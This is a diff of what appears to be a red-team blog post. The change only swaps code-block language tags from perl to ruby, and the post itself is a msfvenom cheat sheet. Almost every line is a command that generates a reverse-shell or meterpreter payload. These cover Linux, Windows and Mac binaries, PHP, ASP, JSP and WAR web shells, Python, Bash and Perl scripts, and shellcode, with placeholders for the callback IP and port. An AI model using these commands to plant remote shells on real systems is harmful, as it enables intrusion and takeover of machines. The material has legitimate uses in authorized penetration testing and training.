@@ -6,62 +6,62 @@ category: Red Team
 date: 2019-7-16
 ---
 # List payloads
-```perl
+```ruby
 msfvenom -l
 ```
 # Binaries
 ## Linux
 
-```perl
+```ruby
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 ```
 ## Windows
 
-```perl
+```ruby
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 ```
 ## Mac
 
-```perl
+```ruby
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
 ```
 
 # Web Payloads
 ## PHP
 
-```perl
+```ruby
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
 ## ASP
 
-```perl
+```ruby
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
 ```
 ## JSP
 
-```perl
+```ruby
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
 ```
 ## WAR
 
-```perl
+```ruby
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
 ```
 # Scripting Payloads
 ## Python
 
-```perl
+```ruby
 msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
 ```
 ## Bash
 
-```perl
+```ruby
 msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
 ```
 ## Perl
 
-```perl
+```ruby
 msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
 ```
 # Shellcode
@@ -69,17 +69,17 @@ msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Co
 
 ## Linux Based Shellcode
 
-```perl
+```ruby
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 ```
 ## Windows Based Shellcode
 
-```perl
+```ruby
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 ```
 ## Mac Based Shellcode
 
-```perl
+```ruby
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 ```
 # Handlers
